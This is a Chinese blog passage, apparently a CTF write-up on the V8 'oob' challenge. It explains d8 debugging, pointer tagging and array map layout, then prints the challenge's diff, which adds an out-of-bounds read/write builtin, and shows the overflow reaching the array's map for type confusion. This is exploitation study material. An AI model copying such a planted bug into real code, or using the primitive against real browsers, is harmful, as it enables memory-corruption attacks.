<h3 id="环境问题"><a href="#环境问题" class="headerlink" title="环境问题"></a>环境问题</h3><p>正常来说，debug版本和release版本都能使用，但是调试这道题的时候，碰到了如下的问题：</p>
<p>release版本正常运行</p>
<p><img src="/2020/10/23/17-42-undefined/image-20201015163847582.png" alt="image-20201015163847582"></p>
<p>debug版本报错</p>
<p><img src="/2020/10/23/17-42-undefined/image-20201015163941100.png" alt="image-20201015163941100"></p>
<blockquote>
<p>e3pem师傅的博客是这样解释的：</p>
<p>了解到是DCHECK宏的问题，然而对宏修改或是注释之后发现编译出来的d8执行还是会出现问题(这个时候已经开始怀疑人生了)。后来仔细的观察了一下师傅们写的文章，发现里面调试oob的时候都是用的release版本，之前也试过release版本的d8确实不会出现问题，所以很可能debug版本的d8就是不行，而别人文章里面出现的debug版本的d8的目的就是为了了解v8的数据是怎么存储的。所以这里正确的用法应该是用release版本进行调试，用debug版本来辅助分析。</p>
</blockquote>
<h2 id="v8的基础知识"><a href="#v8的基础知识" class="headerlink" title="v8的基础知识"></a>v8的基础知识</h2><p>v8编译后二进制名称叫d8而不是v8。</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><h4 id="1-allow-natives-syntax选项"><a href="#1-allow-natives-syntax选项" class="headerlink" title="1.allow-natives-syntax选项"></a>1.allow-natives-syntax选项</h4><p>功能：定义了一些v8运行时支持函数，主要有以下两个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(obj) 输出对象地址</span><br><span class="line">%SystemBreak() 触发调试中断主要结合gdb等调试器使用</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;方法一</span><br><span class="line">winter@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ .&#x2F;d8 --allow-natives-syntax </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;方法二</span><br><span class="line">winter@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ gdb .&#x2F;d8 </span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax test.js</span><br></pre></td></tr></table></figure>

<h4 id="2-job命令"><a href="#2-job命令" class="headerlink" title="2.job命令"></a>2.job命令</h4><p>功能：可视化显示JavaScript对象的内存结构.</p>
<p>gdb下使用：job   对象地址</p>
<p>显示如下，具体v8的内存结构，稍后“v8对象结构”里进一步解释。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x4f9d210dd59</span><br><span class="line">0x4f9d210dd59: [JSArray]</span><br><span class="line"> - map: 0x257bfd042d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x355e47bd1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x04f9d210dce9 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x26cfa9fc0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x1da9ebe001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x04f9d210dce9 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-telescope"><a href="#3-telescope" class="headerlink" title="3.telescope"></a>3.telescope</h4><p>功能：查看一下内存数据</p>
<p>使用：telescope 查看地址 （长度）</p>
<blockquote>
<p>（）表示里面的可以没有</p>
</blockquote>
<h3 id="v8知识点"><a href="#v8知识点" class="headerlink" title="v8知识点"></a>v8知识点</h3><h4 id="指针标记"><a href="#指针标记" class="headerlink" title="指针标记"></a>指针标记</h4><p>v8使用指针标记机制来区分<strong>指针</strong>，<strong>双精度数</strong>和<strong>Smis</strong>（代表）<code>immediate small integer</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Double: Shown as the 64-bit binary representation without any changes</span><br><span class="line">Smi: Represented as value &lt;&lt; 32, i.e 0xdeadbeef is represented as 0xdeadbeef00000000</span><br><span class="line">Pointers: Represented as addr &amp; 1. 0x2233ad9c2ed8 is represented as 0x2233ad9c2ed9</span><br></pre></td></tr></table></figure>

<p>所以，v8中，如果一个值表示的是指针，那么会将该值的最低bit设置为1，但其实真实的值需要减去1。</p>
<p>job直接给对象地址就行，telescope的时候，需要给真实值，需要-1。</p>
<h4 id="v8对象结构"><a href="#v8对象结构" class="headerlink" title="v8对象结构"></a>v8对象结构</h4><p>在/path/v8/out.gn/x64.debug下创建一个test.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak()</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ gdb .&#x2F;d8 </span><br><span class="line">[...]</span><br><span class="line">Reading symbols from .&#x2F;d8...done.</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax test.js </span><br><span class="line">pwndbg&gt; r</span><br><span class="line">[...]</span><br><span class="line">DebugPrint: 0x31c7fffcdd59: [JSArray]</span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; job 0x31c7fffcdd59</span><br><span class="line">0x31c7fffcdd59: [JSArray]</span><br><span class="line"> - map: 0x315768442d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3f6dffcd1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x31c7fffcdce9 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x176329f00c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3ae23f8001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x31c7fffcdce9 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job 0x31c7fffcdce9</span><br><span class="line">0x31c7fffcdce9: [FixedArray]</span><br><span class="line"> - map: 0x176329f00851 &lt;Map&gt;</span><br><span class="line"> - length: 3</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br></pre></td></tr></table></figure>

<p>所以，一个对象有如下属性：</p>
<ul>
<li>map：定义了如何访问对象</li>
<li>prototype：对象的原型（如果有）</li>
<li>elements：对象的地址</li>
<li>length：长度</li>
<li>properties：属性，存有map和length</li>
</ul>
<p>分析：</p>
<p>对象里存储的数据是在elements指向的内存区域的，而且是在对象的上面。也就是说，在内存申请上，v8先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的elements指向了存储元素内容的内存地址。</p>
<p><img src="/2020/10/23/17-42-undefined/image-20201016182850213.png" alt="image-20201016182850213"></p>
<h4 id="map属性详解"><a href="#map属性详解" class="headerlink" title="map属性详解"></a>map属性详解</h4><p>因为稍后需要用到，，所以放在这里讲一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x176329f00801</span><br><span class="line">0x176329f00801: [Map]</span><br><span class="line"> - type: FIXED_ARRAY_TYPE</span><br><span class="line"> - instance size: variable</span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - non-extensible</span><br><span class="line"> - back pointer: 0x176329f004d1 &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: 0</span><br><span class="line"> - instance descriptors (own) #0: 0x176329f00259 &lt;DescriptorArray[0]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - prototype: 0x176329f001d9 &lt;null&gt;</span><br><span class="line"> - constructor: 0x176329f001d9 &lt;null&gt;</span><br><span class="line"> - dependent code: 0x176329f002c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure>

<p>对象的map（数组是对象）是一种数据结构，其中包含以下信息：</p>
<ul>
<li>对象的动态类型，即String，Uint8Array，HeapNumber等。</li>
<li>对象的大小（以字节为单位）</li>
<li>对象的属性及其存储位置</li>
<li>数组元素的类型，例如，unboxed的双精度数或带标记的指针</li>
<li>对象的原型（如果有）</li>
</ul>
<p>属性名称通常存储在Map中，而属性值则存储在对象本身中几个可能区域之一中。然后，map将提供属性值在相应区域中的确切位置。</p>
<p><strong>本质上，映射定义了应如何访问对象。</strong></p>
<p><strong>重点</strong></p>
<ul>
<li><p>对于对象数组：存储的是每个对象的地址</p>
</li>
<li><p>对于浮点数组：以浮点数形式存储数值</p>
</li>
</ul>
<p>所以，如果将对象数组的map换成浮点数组 =&gt; 就变成了浮点数组，会以浮点数的形式存储对象的地址；如果将对浮点组的map换成对象数组 =&gt; 就变成了对象数组，打印浮点数存储的地址。这实际上就是类型混淆的内容。</p>
<h4 id="对象和对象数组"><a href="#对象和对象数组" class="headerlink" title="对象和对象数组"></a>对象和对象数组</h4><p>有时候想着想着有点乱，调试一下。</p>
<p>一个浮点数组、整数数组和一个对象数组。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array = [a,b];</span><br><span class="line">%DebugPrint(obj_array);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ gdb .&#x2F;d8 </span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax test.js </span><br><span class="line">pwndbg&gt; r</span><br><span class="line">[...]</span><br><span class="line">&#x2F;&#x2F;浮点数组</span><br><span class="line">DebugPrint: 0x23ddebc4de71: [JSArray]</span><br><span class="line"> - map: 0x13e6d5782ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1bb893151111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x23ddebc4de49 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x1574a0580c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x19fc51e401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x23ddebc4de49 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3.3</span><br><span class="line"> &#125;</span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">&#x2F;&#x2F;整型数组</span><br><span class="line">DebugPrint: 0x23ddebc4de91: [JSArray]</span><br><span class="line"> - map: 0x13e6d5782d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1bb893151111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x23ddebc4ddb9 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x1574a0580c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x19fc51e401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x23ddebc4ddb9 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">&#x2F;&#x2F;对象数组</span><br><span class="line">DebugPrint: 0x23ddebc4ded1: [JSArray]</span><br><span class="line"> - map: 0x13e6d5782f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1bb893151111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x23ddebc4deb1 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 2</span><br><span class="line"> - properties: 0x1574a0580c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x19fc51e401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x23ddebc4deb1 &lt;FixedArray[2]&gt; &#123;</span><br><span class="line">           0: 0x23ddebc4de71 &lt;JSArray[3]&gt;&#x2F;&#x2F;存储的是浮点数组的地址</span><br><span class="line">           1: 0x23ddebc4de91 &lt;JSArray[3]&gt;&#x2F;&#x2F;存储的是整型数组的地址</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>也就是说，对象数组里面，存储的是别的对象的地址，这里存储的是浮点数组和整型数组的地址</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>分析给定文件中的oob.diff,左边行开头的地方，表示diff文件增加的内容</p>
<blockquote>
<p>该diff文件实际就是增加了一个oob函数。主要分为三部分：定义、实现和关联。</p>
</blockquote>
<p><strong>定义</strong></p>
<blockquote>
<p>为数组添加名为oob的内置函数（就是别人调用的话），内部调用的函数名是kArrayOob（实现oob的函数）</p>
</blockquote>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">src/bootstrapper.cc</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, "oob",</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br></pre></td></tr></table></figure>

<p><strong>实现</strong></p>
<blockquote>
<ul>
<li>函数将首先检查参数的数量是否大于2（第一个参数始终是<code>this</code>参数）。如果是，则返回undefined。</li>
<li>如果只有一个参数（<code>this</code>），它将数组转换成<code>FixedDoubleArray</code>，然后返回array[length]（也就是以浮点数形式返回array[length]）</li>
<li>如果有两个参数（<code>this</code>和<code>value</code>），它以float形式将<code>value</code>写入<code>array[length]</code>。</li>
</ul>
</blockquote>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">src/builtins/builtins-array.cc</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>重点</strong></p>
<p>漏洞就出在这个函数里面</p>
<ul>
<li><p>如果给一个参数，返回了array[length]</p>
</li>
<li><p>如果给两个参数，将给定的参数写入array[length]</p>
</li>
</ul>
<p>很显然array[length]这里冒了，访问到了数组后面的内存区域。调试看一下后面这个内存存储什么信息。</p>
<p>使用debug版本</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.js</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ gdb .&#x2F;d8 </span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax test.js </span><br><span class="line">pwndbg&gt; r</span><br><span class="line">[...]</span><br><span class="line">DebugPrint: 0x71b3a0cde29: [JSArray]</span><br><span class="line"> - map: 0x288120f02ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3086d0311111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x071b3a0cde01 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x109193c80c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x2f6f5d1801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x071b3a0cde01 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3.3</span><br><span class="line"> &#125;</span><br><span class="line">0x288120f02ed9: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x288120f02e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x2f6f5d180609 &lt;Cell value&#x3D; 1&gt;</span><br><span class="line"> - instance descriptors #1: 0x3086d0311f49 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x3086d0311eb9 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     0x109193c84ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x288120f02f29 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x3086d0311111 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x3086d0310ec1 &lt;JSFunction Array (sfi &#x3D; 0x2f6f5d18aca1)&gt;</span><br><span class="line"> - dependent code: 0x109193c802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line">[...]</span><br><span class="line">&#x2F;&#x2F;查看elements的内存地址</span><br><span class="line">pwndbg&gt; telescope 0x071b3a0cde01-1</span><br><span class="line">00:0000│   0x71b3a0cde00 —▸ 0x109193c814f9 ◂— 0x109193c801</span><br><span class="line">01:0008│   0x71b3a0cde08 ◂— 0x300000000</span><br><span class="line">02:0010│   0x71b3a0cde10 ◂— 0x3ff199999999999a</span><br><span class="line">03:0018│   0x71b3a0cde18 ◂— 0x400199999999999a</span><br><span class="line">04:0020│   0x71b3a0cde20 ◂— 0x400a666666666666 (&#39;ffffff\n@&#39;)</span><br><span class="line">05:0028│   0x71b3a0cde28 —▸ 0x288120f02ed9 ◂— 0x40000109193c801</span><br><span class="line">06:0030│   0x71b3a0cde30 —▸ 0x109193c80c71 ◂— 0x109193c808</span><br><span class="line">07:0038│   0x71b3a0cde38 —▸ 0x71b3a0cde01 ◂— 0x109193c814</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;element+10开始的地方，存储的是数据</span><br><span class="line">pwndbg&gt; p &#123;double &#125; 0x71b3a0cde10</span><br><span class="line">$1 &#x3D; 1.1000000000000001</span><br><span class="line">pwndbg&gt; p &#123;double &#125; 0x71b3a0cde18</span><br><span class="line">$2 &#x3D; 2.2000000000000002</span><br><span class="line">pwndbg&gt; p &#123;double &#125; 0x71b3a0cde20</span><br><span class="line">$3 &#x3D; 3.2999999999999998</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查看冒出来地址里存储的数据，发现存储的是map</span><br><span class="line">pwndbg&gt; job 0x288120f02ed9</span><br><span class="line">0x288120f02ed9: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x288120f02e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x2f6f5d180609 &lt;Cell value&#x3D; 1&gt;</span><br><span class="line"> - instance descriptors #1: 0x3086d0311f49 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x3086d0311eb9 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     0x109193c84ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x288120f02f29 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x3086d0311111 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x3086d0310ec1 &lt;JSFunction Array (sfi &#x3D; 0x2f6f5d18aca1)&gt;</span><br><span class="line"> - dependent code: 0x109193c802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure>

<p>综上，我们得到的是读写map和修改map的功能</p>
<p>我们在release版本下实际调试</p>
